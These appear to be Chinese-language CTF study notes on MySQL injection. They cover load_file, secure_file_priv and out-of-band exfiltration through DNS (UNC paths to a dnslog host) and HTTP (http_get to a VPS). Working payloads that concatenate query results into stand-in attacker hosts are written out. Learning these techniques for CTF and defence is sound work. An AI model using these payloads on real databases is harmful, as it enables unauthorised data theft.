root权限才可使用load_file等高危函数
secure_file_priv权限为null时load_file才可读取任意路径
load_file('绝对路径');
高频语句,读取路径内文件的内容并返回
hex(load_file('绝对路径');)
手动将内容转换成十六进制编码,以防出现不可控问题
select * from user where id='参数';
所有为参数的位置都可写十六进制由sql自动转义写入(参数位就是用字符串或数值类型写入的位置)

带外注入
dns带外注入:
需要权限和dns53端口开启
select load_file(concat('\\\\',(select flag from `191981093114514`),'.xxx.dnslog.cn\\a'));
'\\\\'sql转义为\\,\a转义为\a,拼接结果为\\flag{xxx}.xxx.dnslog.cn\a
`191981093114514`反引号会将内部元素转化为select之类的sql标识,以免查询表格时将表格名当成数值查找
concat('\\',(select flag from `191981093114514`),'.xxx.dnslog.cn/a')
    //相当于\\,且不会被转义
利用 Windows UNC共享路径\\主机名\资源的特性:MySQL 调用load_file()读取该路径时,会先对主机名发起DNS解析请求
把查询数据拼在子域名,DNS日志平台记录解析请求,拿到数据。(linux不稳定一般不用dns注入)

HTTP注入:
select http_get(concat('http://xxx.vps.com/?data=',(select flag from `191981093114514`)));
需高权限和80/443端口开启以及允许创建自定义函数
http_get通过创建库来执行http外联功能,所以需要创建自定义函数权限
Windows和Linux都可以使用
